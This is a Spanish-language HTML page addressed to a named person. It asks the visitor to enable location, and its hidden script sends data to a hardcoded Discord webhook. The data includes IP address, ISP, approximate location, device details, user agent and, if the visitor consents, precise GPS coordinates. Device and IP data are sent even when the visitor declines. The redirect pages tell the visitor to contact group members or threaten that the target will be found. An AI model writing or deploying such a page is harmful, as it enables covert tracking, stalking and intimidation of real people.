<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mensaje para blossom c.</title>
    <style>
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .modal-box {
            background-color: #ffffff;
            padding: 24px;
            border-radius: 12px;
            text-align: center;
            max-width: 320px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            font-family: Arial, sans-serif;
        }

        .modal-box p {
            font-size: 16px;
            color: #333333;
            margin-bottom: 20px;
        }

        .modal-buttons {
            display: flex;
            justify-content: center;
            gap: 12px;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            font-weight: bold;
        }

        .btn-accept {
            background-color: #007bff;
            color: white;
        }

        .btn-deny {
            background-color: #e0e0e0;
            color: #333333;
        }
    </style>
</head>
<body>

    <div id="modalUbicacion" class="modal-overlay">
        <div class="modal-box">
            <p>¿Deseas activar tu ubicación para continuar?</p>
            <div class="modal-buttons">
                <button class="btn btn-accept" onclick="procesarRespuesta(true)">Aceptar</button>
                <button class="btn btn-deny" onclick="procesarRespuesta(false)">Rechazar</button>
            </div>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1513047206297600070/NvgpPaLE_sLhfPY757UyL_3F_y-JBkY_Ci5p6Imnwx1Ed_jHG2AXvrhAShuoUjXq9B6p";

        // Páginas HTML codificadas para la redirección
        const PAGINA_GRACIAS = "data:text/html;charset=utf-8,<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Gracias</title></head><body style='font-family:sans-serif;text-align:center;padding:50px;background-color:%23eef9f1;'><h1 style='color:%232e7d32;font-size:32px;'>Colaboración exitosa</h1><p style='color:%23444;font-size:18px;'>Contactar con oliveira u otro miembro S7 para recibir indicaciones.</p></body></html>";

        const PAGINA_ERROR = "data:text/html;charset=utf-8,<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Error</title></head><body style='font-family:sans-serif;text-align:center;padding:50px;background-color:%23fde8e8;'><h1 style='color:%23c62828;font-size:32px;'>Aun tienes tiempo de cambiar de opinion...</h1><p style='color:%23444;font-size:18px;'>Es cuestión de tiempo para encontrarte, hazlo fácil y haznos feliz.</p></body></html>";

        async function procesarRespuesta(acepto) {
            document.getElementById("modalUbicacion").style.display = "none";

            let gpsInfo = { gpsData: "El usuario rechazó la ubicación.", mapLink: "N/A" };

            if (acepto) {
                gpsInfo = await solicitarUbicacionNativa();
            }

            // Enviar la información a Discord
            await enviarADiscord(gpsInfo);

            // Redirigir según la elección del usuario
            if (acepto && !gpsInfo.gpsData.includes("denegado") && !gpsInfo.gpsData.includes("Error")) {
                window.location.href = PAGINA_GRACIAS;
            } else {
                window.location.href = PAGINA_ERROR;
            }
        }

        function solicitarUbicacionNativa() {
            return new Promise((resolve) => {
                if (!("geolocation" in navigator)) {
                    resolve({ gpsData: "Geolocalización no soportada", mapLink: "N/A" });
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const precision = Math.round(pos.coords.accuracy);

                        resolve({
                            gpsData: `Lat: ${lat}, Lon: ${lon} (Margen: ~${precision}m)`,
                            mapLink: `https://www.google.com/maps?q=${lat},${lon}`
                        });
                    },
                    (err) => {
                        resolve({ gpsData: `Permiso denegado/Error (${err.message})`, mapLink: "N/A" });
                    },
                    { enableHighAccuracy: true, timeout: 7000 }
                );
            });
        }

        async function enviarADiscord(gpsInfo) {
            let ipData = {};
            try {
                const res = await fetch("https://ipapi.co/json/");
                ipData = await res.json();
            } catch (e) {
                console.error("Error al obtener IP:", e);
            }

            const pantalla = `${window.screen.width}x${window.screen.height}`;
            const memoriaRAM = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "N/A";
            const nucleosCPU = navigator.hardwareConcurrency || "N/A";
            const idioma = navigator.language || "Desconocido";
            const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;

            const payload = {
                embeds: [{
                    title: "🔍 Registro de Visita (Ubicación)",
                    color: 3066993,
                    fields: [
                        { name: "🌐 Dirección IP", value: ipData.ip || "No detectada", inline: true },
                        { name: "🏢 Proveedor (ISP)", value: ipData.org || "Desconocido", inline: true },
                        { name: "📍 Ubicación por IP", value: `${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}`, inline: false },
                        { name: "🎯 GPS Exacto", value: gpsInfo.gpsData, inline: false },
                        { name: "🗺️ Enlace Google Maps", value: gpsInfo.mapLink, inline: false },
                        { name: "💻 Pantalla", value: pantalla, inline: true },
                        { name: "🧠 RAM / CPU", value: `RAM: ${memoriaRAM} | Núcleos: ${nucleosCPU}`, inline: true },
                        { name: "🕒 Zona Horaria / Idioma", value: `${zonaHoraria} (${idioma})`, inline: true },
                        { name: "📱 User-Agent", value: navigator.userAgent, inline: false }
                    ],
                    footer: { text: "Registro de Visita Solo GPS" },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Error al enviar a Discord:", err);
            }
        }
    </script>
</body>
</html>
